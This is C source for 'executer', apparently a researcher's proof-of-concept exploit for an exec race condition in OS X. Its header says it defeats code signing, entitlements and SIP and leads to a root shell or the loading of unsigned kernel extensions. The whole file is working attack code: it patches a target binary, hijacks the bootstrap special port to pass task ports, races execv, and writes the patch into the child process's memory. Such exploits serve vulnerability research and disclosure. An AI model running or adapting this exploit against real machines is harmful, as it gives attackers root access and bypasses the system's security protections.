//ianbeer

/*
executer - an exploit for a cute bug in exec

this utility allows you to break userspace code-signing, entitlements, SIP and kernel code signing on OS X with one bug

whilst the actual exploit is in this file you probably want to use one of the wrapper scripts:

  * root_shell.sh - get a root shell
  * load_kext.sh  - load an unsigned kext as a regular user

the root_shell.sh script should work on all recent OS X releases

the load_kext.sh script needs a binary diff file to patch out the signature checks in kextload - one is provided for 10.11.3

this file operates on binary diffs produced by differ.py
*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>

#include <sys/stat.h>

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

const int max_tries = 25;

void usage() {
  printf("./executer -p patch_file -o original -- target <target_arg0> <target_arg1>...\n");
  printf("  if the target is a fat binary, original should be a lipo'ed thin version\n");
  exit(EXIT_FAILURE);
}

size_t roundup(size_t val) {
  return (val + 0xfffULL) & ~0xfffULL;
}

size_t rounddown(size_t val) {
  return val & ~0xfffULL;
}

char* ptr_roundup(void* val) {
  return (char*)roundup((size_t)val);
}

char* ptr_rounddown(void* val) {
  return (char*)rounddown((size_t)val);
}

// load a file, making sure the buffer is page-aligned
char* load_file(char* path, size_t* length) {
  struct stat st = {0};
  if ((stat(path, &st) == -1)) {
    FAIL("stating file");
  }

  *length = st.st_size;
  size_t to_allocate = roundup(*length);
  mach_vm_address_t addr = 0;
  kern_return_t err = mach_vm_allocate(mach_task_self(),
                                       &addr,
                                       to_allocate,
                                       VM_FLAGS_ANYWHERE);
  MACH_ERR("allocating buffer for file", err);

  FILE* f = fopen(path, "r");
  if (f == NULL) {
    FAIL("opening file");
  }

  fread((void*)addr, *length, 1, f);
  fclose(f);

  return (char*)addr;
}

// at what offset (rounded down to a page boundary) from the start of the mapping in the target should we write?
size_t target_patch_start_offset = 0;

// how much should we write (rounded up to a page boundary)
size_t target_patch_write_length = 0;

// pointer to the replacement bytes to overwrite with
char* replacement_bytes = NULL;

/* apply the patch, recording the lowest and highest addresses we touch */
// original is page-aligned
void apply_patch(char* original, size_t original_length, char* patch, size_t patch_length) {
  // patch format is:
  // u32 offset
  // u32 length
  // u8 * length bytes to be written

  char* lowest = (char*)UINTPTR_MAX;
  char* highest = 0;

  size_t remaining = patch_length;
  while (remaining > 8) {
    uint32_t offset = *(uint32_t*)patch;
    uint32_t length = *(uint32_t*)(patch+4);
    remaining -= 8;
    patch += 8;

    if (length == 0) {
      FAIL("bad patch");
    }

    if (length > remaining) {
      FAIL("bad patch");
    }

    if ((offset + length) > original_length) {
      FAIL("bad patch");
    }

    // record if we're extending the boundaries of touched pages
    if ((original+offset) < lowest) {
      lowest = original+offset;
    }

    if ((original+offset+length) > highest) {
      highest = original+offset+length;
    }

    // apply the patch
    memcpy(original+offset, patch, length);
    remaining -= length;
    patch += length;
  }

  replacement_bytes = ptr_rounddown(lowest);
  target_patch_start_offset = replacement_bytes - original;
  target_patch_write_length = ptr_roundup(highest) - replacement_bytes;
}

void verify_original(char* original, size_t original_length) {
  if (original_length < 4) {
    FAIL("original too small!");
  }

  uint32_t magic = *(uint32_t*)original;

  if (magic != 0xfeedfacf) {
    FAIL("the original isn't a 64-bit MACH-O. If it's a FAT binary use: lipo -thin x86-64");
  }
}

char* patch = NULL;
size_t patch_length = 0;

char* original = NULL;
size_t original_length = 0;

char* exec_path = NULL;

char** trailing_args_for_child = NULL;

void parse_args(int argc, char** argv) {
  char* patch_path = NULL;
  char* original_path = NULL;
  int opt;

  while ((opt = getopt(argc, argv, "p:o:")) != -1) {
    switch(opt) {
    case 'p':
      patch_path = optarg;
      break;

    case 'o':
      original_path = optarg;
      break;
    }
  }

  trailing_args_for_child = &argv[optind];

  if (patch_path == NULL || original_path == NULL) {
    usage();
  }

  patch    = load_file(patch_path, &patch_length);
  original = load_file(original_path, &original_length);
}

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {
  kern_return_t err;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);

  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);

  MACH_ERR("allocating shared port", err);

  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("inserting MAKE_SEND into shared port", err);

  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);

  LOG("child got stashed port");

  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err); 

  // send the reply port in a hello message
  simple_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);
 
  LOG("child sent hello message to parent over shared port");

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);

  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");
  }

  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);

  LOG("child restored stolen port");
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {
  kern_return_t err;

  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);

  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);

  LOG("parent received hello message from child");
  
  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};

  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;

  special_port_msg.body.msgh_descriptor_count = 1;

  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&special_port_msg.header);
  MACH_ERR("parent sending special port back to child", err);
  
  return shared_port_parent;
}

/*** end of port dancer code ***/

void do_child(mach_port_t shared_port) {
  kern_return_t err;
  
  // create a reply port to receive an ack that we should exec the target
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err); 

  // send our task port to our parent over the shared port
  port_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;

  msg.body.msgh_descriptor_count = 1;

  msg.port.name = mach_task_self();
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);
 
  LOG("child sent task port back to parent");

  // wait for a reply to ack that the other end got our task port and that we should exec the target
  simple_msg_rcv_t reply = {0};
  err = mach_msg(&reply.header, MACH_RCV_MSG, 0, sizeof(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving ack\n", err);

  LOG("child got ack message, exec-ing target binary...");

  // exec the target binary - its important that you pass args which would make the target fail under normal conditions
  // so that we can detect if we lost the race
  execv(trailing_args_for_child[0], trailing_args_for_child);
}

void do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us its task port
  port_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child task port message", err);

  mach_port_t child_task_port = msg.port.name;
  if (child_task_port == MACH_PORT_NULL) {
    FAIL("invalid child task port");
  }

  LOG("parent received child's task port");

  // before we ack the task port message to signal our child should execve the target binary get the lowest mapped address:
  struct vm_region_basic_info_64 region;
  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
  memory_object_name_t object_name = MACH_PORT_NULL;

  mach_vm_size_t target_first_size = 0x1000;
  mach_vm_address_t original_first_addr = 0x0;

  err = mach_vm_region(child_task_port,
                       &original_first_addr,
                       &target_first_size,
                       VM_REGION_BASIC_INFO_64,
                       (vm_region_info_t)&region,
                       &region_count,
                       &object_name);
  MACH_ERR("getting first mach_vm_region for target process\n", err);

  LOG("parent trying to win race");

  // reply to the child so that it knows it's time to exec the target
  simple_msg_send_t reply = {0};

  reply.header.msgh_size = sizeof(reply);
  reply.header.msgh_local_port = MACH_PORT_NULL;
  reply.header.msgh_remote_port = msg.header.msgh_remote_port;
  reply.header.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0);

  err = mach_msg_send(&reply.header);
  MACH_ERR("parent sending ack message", err);

  // now start trying to win the race
  mach_vm_address_t target_first_addr = 0x0;
  for (;;) {
    // spin until we see that the map has been swapped and the binary is loaded into it:
    region_count = VM_REGION_BASIC_INFO_COUNT_64;
    object_name = MACH_PORT_NULL;
    target_first_size = 0x1000;
    target_first_addr = 0x0;

    err = mach_vm_region(child_task_port,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);

    if (target_first_addr != original_first_addr && target_first_addr < 0x200000000) {
      // the first address has changed implying that the map was probably swapped
      // let's try to win the race :-)
      break;
    }

  }

  // address to patch in the target (rounded down to a page boundary)
  mach_vm_address_t target_addr = target_first_addr + target_patch_start_offset;

  // size of the patch we want to apply in the target (rounded up to a page-multiple)
  mach_msg_type_number_t target_size = target_patch_write_length;

  // part 1: change the protect of the region we want to patch to RWX so we can modify it
  kern_return_t protect_err = mach_vm_protect(child_task_port, target_addr, target_size, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);

  // part 2: overwrite the target region with our patch
  kern_return_t write_err = mach_vm_write(child_task_port, target_addr, (vm_offset_t)replacement_bytes, target_size);  
}

int main(int argc, char** argv) {
  parse_args(argc, argv);

  // check that the original is actually a 64-bit mach-o and not a fat binary
  verify_original(original, original_length);
  
  // apply the patch to the original
  apply_patch(original, original_length, patch, patch_length);

  int tries = 0;
  for (;;) {
    setup_shared_port();

    pid_t child_pid = fork();
    if (child_pid == -1) {
      FAIL("forking");
    }

    if (child_pid == 0) {
      mach_port_t shared_port_child = recover_shared_port_child();
      do_child(shared_port_child);
    } else {
      mach_port_t shared_port_parent = recover_shared_port_parent();
      do_parent(shared_port_parent);

      int status;
      wait(&status);
      
      if (status == 0) {
        LOG("worked :-)");
        break;
      }

      tries++;
      if (tries > max_tries) {
        FAIL("either didn't win the race (try again) or we won but the child didn't exit cleanly with a 0 return code");
        break;
      }
      
      LOG("trying again...");
    }
  }

  return 0;
}
